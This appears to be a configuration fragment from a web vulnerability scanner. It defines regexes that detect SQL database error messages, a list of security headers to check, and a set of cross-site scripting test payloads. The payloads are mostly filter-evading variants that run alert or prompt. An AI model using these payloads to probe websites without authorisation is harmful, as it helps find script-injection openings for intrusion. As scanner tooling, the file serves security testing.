REGEXP = ["(sql syntax|error|warning|invalid).*?(mysql|oracle|(\s|^)pg(\s|$)|postgresql|pgqlsqlite|mysqli|sql server)",
"(SQL|oracle|postgresql|sqlite|mysql|sql server|quot).*?(not properly|error)",
"incorrect syntax near"]


HEADERS = {"Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security", "Permissions-Policy", "Feature-Policy", 
            "Referrer-Policy", "X-Content-Type-Options"}

XSS_PAYLOADS = {"<script>alert(1)</script>",
"<script>{{constructor.constructor('alert(1)')()}}</script>",
"<script>alert`1`</script>",
"<script>alert&lpar;1&rpar;</script>",
"<script>alert&#x28;1&#x29</script>",
"<script>alert&#40;1&#41</script>",
"<img src/onerror=prompt(8)>",
"<script>(alert)(1)</script>",
"<script>a=alert,a(1)</script>",
"innerHTML=location.hash>#<script>alert(1)</script>",
"<script>eval(location.hash.slice(1)>#alert(1)</script>",
"<script>top[8680439..toString(30)](1)</script>",
"<script>top[\"al\"+\"ert\"](1)</script>",
"<script>[1].find(alert)</script>",
"<script>top[/al/.source+/ert/.source](1)</script>",
"<script>al\u0065rt(1)</script>",
"<script>top['al\145rt'](1)</script>",
"<script>top['al\x65rt'](1)</script>",
"<script>eval(URL.slice(-8))>#alert(1)</script>"
}